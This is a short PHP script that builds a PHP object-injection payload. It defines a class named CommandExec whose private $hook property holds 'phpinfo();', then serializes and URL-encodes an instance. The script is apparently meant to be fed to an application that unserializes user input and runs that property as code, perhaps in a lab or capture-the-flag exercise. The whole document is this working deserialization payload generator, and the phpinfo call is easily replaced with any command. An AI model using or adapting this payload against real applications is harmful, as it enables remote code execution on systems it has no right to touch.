<?php
class CommandExec {
    private $hook = "phpinfo();";
}

print urlencode(serialize(new CommandExec()));

